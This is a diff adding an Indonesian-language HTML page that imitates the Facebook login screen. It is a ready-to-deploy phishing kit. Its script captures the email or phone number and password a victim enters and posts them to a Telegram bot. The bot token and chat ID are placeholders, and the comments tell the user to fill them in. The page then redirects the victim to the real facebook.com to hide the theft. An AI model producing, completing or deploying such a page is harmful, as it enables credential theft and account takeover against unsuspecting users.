@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Selamat Datang di Facebook</title>
+  <style>
+    body { background-color: #e3e3f5; color: black; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
+    .top { background-color: #3b5998; color: white; padding: 20px; font-size: 28px; font-weight: bold; text-align: center; }
+    .login-box {
+      background: white; max-width: 400px; margin: 50px auto; padding: 20px;
+      border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    .login-box input {
+      width: 100%; padding: 10px; margin: 10px 0;
+      border-radius: 6px; border: 1px solid #ccc;
+    }
+    .login-box button {
+      background-color: #3b5998; color: white; border: none; padding: 10px;
+      width: 100%; border-radius: 6px; font-size: 16px; cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="top">facebook</div>
+  <div class="login-box">
+    <h2>Masuk ke Facebook</h2>
+    <input type="text" id="email" placeholder="Email atau Nomor HP" />
+    <input type="password" id="password" placeholder="Kata Sandi" />
+    <button onclick="kirimData()">Masuk</button>
+  </div>
+
+  <script>
+    function kirimData() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const token = "ISI_TOKEN_BOT_LO"; // ganti dengan token bot kamu
+      const chat_id = "ISI_CHAT_ID_LO"; // ganti dengan chat ID kamu
+      const pesan = `Login FB\nEmail: ${email}\nSandi: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: pesan
+        })
+      }).then(response => {
+        // Redirect ke halaman Facebook palsu atau lainnya setelah kirim
+        window.location.href = "https://www.facebook.com"; // bisa diganti
+      });
+    }
+  </script>
+</body>
+</html>
